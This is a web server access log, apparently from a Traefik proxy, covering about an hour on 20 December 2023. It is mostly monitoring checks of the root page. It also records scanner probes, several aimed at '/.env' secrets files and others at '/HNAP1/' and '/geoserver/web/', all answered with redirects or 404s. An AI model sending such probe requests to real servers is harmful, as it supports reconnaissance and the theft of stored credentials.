57.129.23.166 - - [20/Dec/2023:15:33:51 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 2047 "web-to-websecure@internal" "-" 0ms
57.129.23.166 - - [20/Dec/2023:15:33:51 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 2048 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [20/Dec/2023:15:34:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2049 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:15:34:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2050 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:15:35:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2051 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:15:35:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2052 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:15:36:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2053 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:15:36:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2054 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:15:37:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2055 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [20/Dec/2023:15:37:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2056 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:15:38:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2057 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:15:38:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2058 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:15:39:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2059 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:15:39:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2060 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:15:40:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2061 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:15:40:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2062 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:15:41:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2063 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:15:41:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2064 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:15:42:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2065 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:15:42:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2066 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:15:43:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2067 "www@docker" "http://172.20.0.9:80" 0ms
194.187.176.209 - - [20/Dec/2023:15:43:22 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 2068 "-" "-" 0ms
194.187.176.6 - - [20/Dec/2023:15:43:22 +0000] "GET /favicon.ico HTTP/1.1" 404 19 "-" "-" 2069 "-" "-" 0ms
167.71.120.76 - - [20/Dec/2023:15:43:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2070 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:15:44:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2071 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:15:44:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2072 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:15:45:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2073 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:15:45:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2074 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:15:46:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2075 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:15:46:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2076 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:15:47:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2077 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:15:47:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2078 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:15:48:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2079 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:15:48:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2080 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:15:49:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2081 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:15:49:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2082 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:15:50:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2083 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:15:50:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2084 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:15:51:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2085 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [20/Dec/2023:15:51:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2086 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:15:52:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2087 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:15:52:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2088 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:15:53:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2089 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:15:53:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2090 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:15:54:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2091 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:15:54:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2092 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:15:55:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2093 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [20/Dec/2023:15:55:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2094 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:15:56:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2095 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:15:56:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2096 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:15:57:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2097 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:15:57:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2098 "www@docker" "http://172.20.0.9:80" 0ms
45.90.163.19 - - [20/Dec/2023:15:57:51 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 2099 "web-to-websecure@internal" "-" 0ms
45.90.163.19 - - [20/Dec/2023:15:57:51 +0000] "POST /HNAP1/ HTTP/1.1" 308 18 "-" "-" 2100 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [20/Dec/2023:15:58:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2101 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:15:58:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2102 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:15:59:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2103 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [20/Dec/2023:15:59:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2104 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:16:00:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2105 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:16:00:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2106 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:16:01:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2107 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:16:01:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2108 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:16:02:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2109 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:16:02:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2110 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:16:03:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2111 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [20/Dec/2023:16:03:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2112 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:16:04:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2113 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:16:04:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2114 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:16:05:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2115 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:16:05:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2116 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:16:06:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2117 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:16:06:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2118 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:16:07:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2119 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [20/Dec/2023:16:07:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2120 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:16:08:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2121 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:16:08:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2122 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:16:09:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2123 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [20/Dec/2023:16:09:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2124 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:16:10:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2125 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:16:10:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2126 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:16:11:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2127 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:16:11:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2128 "www@docker" "http://172.20.0.9:80" 1ms
45.134.26.69 - - [20/Dec/2023:16:11:41 +0000] "GET /oauth/idp/.well-known/openid-configuration HTTP/1.1" 404 19 "-" "-" 2129 "-" "-" 0ms
138.246.253.24 - - [20/Dec/2023:16:11:49 +0000] "GET /robots.txt HTTP/1.1" 404 19 "-" "-" 2130 "-" "-" 0ms
159.203.109.206 - - [20/Dec/2023:16:12:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2131 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:16:12:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2132 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:16:13:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2133 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:16:13:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2134 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:16:14:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2135 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:16:14:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2136 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:16:15:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2137 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:16:15:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2138 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:16:16:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2139 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:16:16:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2140 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:16:17:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2141 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [20/Dec/2023:16:17:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2142 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:16:18:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2143 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:16:18:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2144 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:16:19:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2145 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:16:19:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2146 "www@docker" "http://172.20.0.9:80" 1ms
143.110.222.166 - - [20/Dec/2023:16:20:13 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 2147 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [20/Dec/2023:16:20:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2148 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:16:20:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2149 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:16:21:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2150 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:16:21:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2151 "www@docker" "http://172.20.0.9:80" 0ms
149.102.133.149 - - [20/Dec/2023:16:21:59 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 2152 "web-to-websecure@internal" "-" 0ms
149.102.133.149 - - [20/Dec/2023:16:22:00 +0000] "GET /.env HTTP/1.1" 404 19 "-" "-" 2153 "-" "-" 0ms
159.203.109.206 - - [20/Dec/2023:16:22:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2154 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:16:22:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2155 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:16:23:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2156 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:16:23:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2157 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:16:24:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2158 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:16:24:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2159 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:16:25:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2160 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [20/Dec/2023:16:25:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2161 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:16:26:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2162 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:16:26:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2163 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:16:27:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2164 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:16:27:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2165 "www@docker" "http://172.20.0.9:80" 0ms
143.110.222.166 - - [20/Dec/2023:16:28:10 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 2166 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [20/Dec/2023:16:28:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2167 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:16:28:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2168 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:16:29:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2169 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:16:29:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2170 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:16:30:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2171 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [20/Dec/2023:16:30:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2172 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:16:31:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2173 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [20/Dec/2023:16:31:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2174 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:16:32:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2175 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:16:32:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2176 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:16:33:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2177 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [20/Dec/2023:16:33:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2178 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:16:34:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2179 "www@docker" "http://172.20.0.9:80" 1ms
167.71.120.76 - - [20/Dec/2023:16:34:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2180 "www@docker" "http://172.20.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:16:35:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2181 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:16:35:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2182 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:16:36:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2183 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:16:36:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2184 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:16:37:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2185 "www@docker" "http://172.20.0.9:80" 0ms
74.82.47.3 - - [20/Dec/2023:16:37:23 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 2186 "web-to-websecure@internal" "-" 0ms
167.71.120.76 - - [20/Dec/2023:16:37:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2187 "www@docker" "http://172.20.0.9:80" 1ms
185.142.236.40 - - [20/Dec/2023:16:37:39 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 2188 "web-to-websecure@internal" "-" 0ms
185.142.236.40 - - [20/Dec/2023:16:37:41 +0000] "GET /robots.txt HTTP/1.1" 301 17 "-" "-" 2189 "web-to-websecure@internal" "-" 0ms
185.142.236.40 - - [20/Dec/2023:16:37:42 +0000] "GET /sitemap.xml HTTP/1.1" 301 17 "-" "-" 2190 "web-to-websecure@internal" "-" 0ms
185.142.236.40 - - [20/Dec/2023:16:37:43 +0000] "GET /.well-known/security.txt HTTP/1.1" 301 17 "-" "-" 2191 "web-to-websecure@internal" "-" 0ms
185.142.236.40 - - [20/Dec/2023:16:37:44 +0000] "GET /favicon.ico HTTP/1.1" 301 17 "-" "-" 2192 "web-to-websecure@internal" "-" 0ms
172.233.57.47 - - [20/Dec/2023:16:38:18 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 2193 "-" "-" 0ms
172.233.57.47 - - [20/Dec/2023:16:38:18 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 2194 "-" "-" 0ms
159.203.109.206 - - [20/Dec/2023:16:38:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2195 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:16:38:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2196 "www@docker" "http://172.20.0.9:80" 1ms
165.154.135.215 - - [20/Dec/2023:16:39:12 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 2197 "-" "-" 0ms
165.154.135.215 - - [20/Dec/2023:16:39:13 +0000] "GET /favicon.ico HTTP/1.1" 404 19 "-" "-" 2198 "-" "-" 0ms
165.154.135.215 - - [20/Dec/2023:16:39:13 +0000] "GET /robots.txt HTTP/1.1" 404 19 "-" "-" 2199 "-" "-" 0ms
165.154.135.215 - - [20/Dec/2023:16:39:13 +0000] "GET /sitemap.xml HTTP/1.1" 404 19 "-" "-" 2200 "-" "-" 0ms
159.203.109.206 - - [20/Dec/2023:16:39:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2201 "www@docker" "http://172.20.0.9:80" 0ms
74.82.47.3 - - [20/Dec/2023:16:39:24 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 2202 "web-to-websecure@internal" "-" 0ms
74.82.47.3 - - [20/Dec/2023:16:39:25 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 2203 "-" "-" 0ms
57.129.23.166 - - [20/Dec/2023:16:39:31 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 2204 "web-to-websecure@internal" "-" 0ms
57.129.23.166 - - [20/Dec/2023:16:39:31 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 2205 "web-to-websecure@internal" "-" 0ms
167.71.120.76 - - [20/Dec/2023:16:39:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2206 "www@docker" "http://172.20.0.9:80" 0ms
65.49.1.93 - - [20/Dec/2023:16:39:43 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 2207 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [20/Dec/2023:16:40:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2208 "www@docker" "http://172.20.0.9:80" 0ms
94.102.61.88 - - [20/Dec/2023:16:40:30 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 2209 "-" "-" 0ms
167.71.120.76 - - [20/Dec/2023:16:40:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2210 "www@docker" "http://172.20.0.9:80" 0ms
74.82.47.3 - - [20/Dec/2023:16:40:34 +0000] "GET /favicon.ico HTTP/1.1" 301 17 "-" "-" 2211 "web-to-websecure@internal" "-" 0ms
65.49.1.84 - - [20/Dec/2023:16:40:49 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 2212 "web-to-websecure@internal" "-" 0ms
65.49.1.83 - - [20/Dec/2023:16:40:49 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 2213 "-" "-" 0ms
65.49.1.83 - - [20/Dec/2023:16:41:18 +0000] "GET /favicon.ico HTTP/1.1" 301 17 "-" "-" 2214 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [20/Dec/2023:16:41:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2215 "www@docker" "http://172.20.0.9:80" 0ms
74.82.47.3 - - [20/Dec/2023:16:41:19 +0000] "GET /geoserver/web/ HTTP/1.1" 301 17 "-" "-" 2216 "web-to-websecure@internal" "-" 0ms
167.71.120.76 - - [20/Dec/2023:16:41:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2217 "www@docker" "http://172.20.0.9:80" 1ms
65.49.1.92 - - [20/Dec/2023:16:41:53 +0000] "GET /geoserver/web/ HTTP/1.1" 301 17 "-" "-" 2218 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [20/Dec/2023:16:42:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2219 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:16:42:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2220 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:16:43:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2221 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:16:43:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2222 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:16:44:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2223 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:16:44:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2224 "www@docker" "http://172.20.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:16:45:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2225 "www@docker" "http://172.20.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:16:45:33 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2226 "www@docker" "http://172.20.0.9:80" 1ms
96.126.112.220 - - [20/Dec/2023:16:46:15 +0000] "GET /5Ilr HTTP/1.1" 404 19 "-" "-" 2227 "-" "-" 0ms
96.126.112.220 - - [20/Dec/2023:16:46:15 +0000] "GET /OxDR HTTP/1.1" 404 19 "-" "-" 2228 "-" "-" 0ms
159.203.109.206 - - [20/Dec/2023:16:46:19 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2229 "www@docker" "http://172.20.0.9:80" 1ms
139.144.168.186 - - [20/Dec/2023:16:46:20 +0000] "GET /iClD HTTP/1.1" 301 17 "-" "-" 2230 "web-to-websecure@internal" "-" 0ms
139.144.168.186 - - [20/Dec/2023:16:46:20 +0000] "GET /jVFW HTTP/1.1" 301 17 "-" "-" 2231 "web-to-websecure@internal" "-" 0ms
